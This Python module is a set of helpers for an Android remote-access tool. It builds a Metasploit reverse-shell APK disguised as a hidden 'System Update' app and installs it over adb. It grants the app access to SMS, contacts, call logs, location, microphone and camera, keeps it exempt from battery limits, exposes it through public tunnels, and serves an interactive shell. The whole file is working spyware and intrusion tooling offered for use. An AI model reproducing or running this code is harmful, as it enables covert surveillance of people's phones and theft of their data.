""""Remote shell" shared helpers — used by Full Access (64) and Auto-Pivot (65).

Single source of truth for: build FGS payload → install/launch on device →
tunnel (pinggy/ngrok/portmap) → pure-Python interactive shell (no Metasploit).
Everything is exception-safe: a failure returns a friendly message, never
crashes the Andro-DLS CLI.
"""
from __future__ import annotations

import json
import os
import re
import socket
import subprocess
import time
from pathlib import Path

from modules.console import console, adb, adb_output, print_error, print_success, print_warning

PKG = "com.metasploit.stage"


def _default_lport() -> int:
    """Listener port. Priority: DLS_LPORT env > saved portmap local_port > 4444."""
    env = os.environ.get("DLS_LPORT")
    if env:
        try:
            return int(env)
        except ValueError:
            pass
    try:
        cfg = json.loads(
            (Path(__file__).resolve().parent.parent / ".payload-build" / "portmap.json").read_text()
        )
        lp = cfg.get("local_port")
        if lp:
            return int(lp)
    except Exception:
        pass
    return 4444


LPORT = _default_lport()
LHOST = "127.0.0.1"

PERMISSIONS = (
    "POST_NOTIFICATIONS",
    "READ_SMS",
    "READ_CONTACTS",
    "READ_CALL_LOG",
    "ACCESS_FINE_LOCATION",
    "RECORD_AUDIO",
    "CAMERA",
)

_PAYLOAD_CACHE: Path | None = None


def _run(cmd, **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def root_dir() -> Path:
    return Path(__file__).resolve().parent.parent


# --------------------------------------------------------------------------
# Device helpers
# --------------------------------------------------------------------------

def first_device(allowed_wifi: bool = True) -> str | None:
    """Return the first adb `device` serial (Wi-Fi serials have ':')."""
    try:
        out = adb_output(["devices"])
    except Exception:
        return None
    for line in out.splitlines()[1:]:
        p = line.split()
        if len(p) >= 2 and p[1] == "device":
            if not allowed_wifi and ":" in p[0]:
                continue
            return p[0]
    return None


def _a(serial: str, args: list[str]):
    """Run an adb command against a specific serial (captured)."""
    return adb(["-s", serial] + args)


def read_wifi_ip(serial: str) -> str | None:
    cands = (
        ["shell", "ip", "-f", "inet", "addr", "show", "wlan0"],
        ["shell", "ip", "route", "get", "8.8.8.8"],
        ["shell", "ifconfig", "wlan0"],
    )
    for args in cands:
        try:
            out = _a(serial, args).stdout
        except Exception:
            out = ""
        m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out) or re.search(
            r"\bsrc\s+(\d+\.\d+\.\d+\.\d+)", out
        )
        if m:
            ip = m.group(1)
            if ip != "127.0.0.1" and not ip.startswith("169.254."):
                return ip
    return None


# --------------------------------------------------------------------------
# Payload build / install / launch
# --------------------------------------------------------------------------

def build_fgs_payload(lhost: str = LHOST, lport: int | str = LPORT,
                      enhanced: bool = True, camo: bool = True) -> Path | None:
    """Build the FGS (battery-killer-safe) payload.

    Defaults to the ENHANCED builder: extra permissions + system-app
    camouflage ("System Update", hidden launcher). Falls back to the base
    build_payload.sh if the enhanced script is missing.
    """
    global _PAYLOAD_CACHE
    out = root_dir() / ".payload-build" / "payload.apk"
    out.parent.mkdir(parents=True, exist_ok=True)
    base = root_dir() / "build_payload.sh"
    enhanced_script = root_dir() / "build_payload_enhanced.sh"
    script = enhanced_script if enhanced_script.exists() else base
    if not script.exists():
        print_error("no payload builder found in repo root")
        return None
    try:
        if script.name == "build_payload_enhanced.sh":
            args = ["bash", str(script), "--fgs", "--extra-perms", "--agent"]
            if camo:
                args.append("--camo")
            args += [lhost, str(lport), str(out)]
        else:
            args = ["bash", str(script), "--fgs", lhost, str(lport), str(out)]
        r = _run(args)
    except Exception as e:
        print_error(f"payload build exception: {e}")
        return None
    if r.returncode != 0 or not out.exists():
        print_error("payload build failed (see build_payload_enhanced.sh output)")
        return None
    _PAYLOAD_CACHE = out
    return out


def install_and_launch(serial: str, apk: Path) -> bool:
    """Install payload; on signature mismatch uninstall+reinstall; grant perms."""
    if apk is None or not apk.exists():
        print_error("payload apk missing")
        return False
    try:
        r = _a(serial, ["install", "-r", str(apk)])
        if r.returncode != 0:
            _a(serial, ["uninstall", PKG])
            r = _a(serial, ["install", str(apk)])
        if r.returncode != 0:
            print_error(f"install failed: {(r.stderr or r.stdout)[-200:]}")
            return False
    except Exception as e:
        print_error(f"install exception: {e}")
        return False
    print_success(f"payload installed on {serial}")
    for perm in PERMISSIONS:
        _a(serial, ["shell", "pm", "grant", PKG, f"android.permission.{perm}"])
    _a(serial, ["shell", "dumpsys", "deviceidle", "whitelist", "+" + PKG])
    try:
        _a(serial, ["shell", "am", "force-stop", PKG])
        _a(serial, ["shell", "am", "start", "-n", f"{PKG}/.MainActivity"])
    except Exception:
        pass
    return True


def set_reverse(serial: str, port: int = LPORT) -> None:
    """adb reverse — rides the adb transport, survives USB→WiFi pivot."""
    try:
        _a(serial, ["reverse", f"tcp:{port}", f"tcp:{port}"])
        print_success(f"reverse tcp:{port} → tcp:{port} set")
    except Exception as e:
        print_warning(f"reverse failed: {e}")


# --------------------------------------------------------------------------
# Tunnel
# --------------------------------------------------------------------------

def loadportmap_config() -> dict | None:
    """Saved portmap config (host/user/ports), or None."""
    try:
        kind = json.loads(
            (Path(__file__).resolve().parent.parent / ".payload-build" / "portmap.json").read_text()
        )
        return kind or None
    except Exception:
        return None


def open_tunnel(provider: str | None = None):
    """Start a public tunnel to localhost:LPORT; provider None → pick best
    (portmap if configured — permanent — else pinggy/ngrok)."""
    try:
        from modules import tunnel
    except Exception as e:
        print_warning(f"tunnel module unavailable: {e}")
        return None
    if provider is None:
        provider = "portmap" if tunnel.load_portmap_config() else None
    try:
        t = tunnel.start_tunnel(LPORT, provider)
    except Exception as e:
        print_warning(f"tunnel start failed: {e}")
        return None
    if t and t.endpoint_host:
        print_success(f"tunnel up: {t.endpoint} → localhost:{LPORT}")
        return t
    print_warning(f"tunnel {provider or 'auto'} not up (no config?) — local channel still works")
    return t


def stop_tunnel(t) -> None:
    try:
        from modules import tunnel

        tunnel.stop_tunnel(t)
    except Exception:
        pass


# --------------------------------------------------------------------------
# Shell listener
# --------------------------------------------------------------------------

def capture_stage() -> Path | None:
    """Grab the android/shell/reverse_tcp raw stage once (for our listener)."""
    stage = root_dir() / ".payload-build" / "shell-stage.bin"
    if stage.exists():
        return stage
    try:
        r = _run(
            ["msfvenom", "-p", "android/shell/reverse_tcp",
             f"LHOST={LHOST}", f"LPORT={LPORT}", "-f", "raw", "-o", str(stage)]
        )
        if r.returncode == 0 and stage.exists() and stage.stat().st_size > 0:
            return stage
    except Exception:
        pass
    return None


def run_shell(timeout: int = 120) -> None:
    """Bind the pure-Python listener and serve one interactive shell."""
    from modules import shell_access

    stage = capture_stage()
    try:
        if stage:
            shell_access.run(LHOST, LPORT, timeout=timeout, stage_file=str(stage))
        else:
            print_warning("no stage — plain shell fallback")
            shell_access.run(LHOST, LPORT, timeout=timeout)
    except (KeyboardInterrupt, EOFError):
        print("\n[dim]session detached[/dim]")
    except Exception as e:
        print_warning(f"shell ended: {e}")
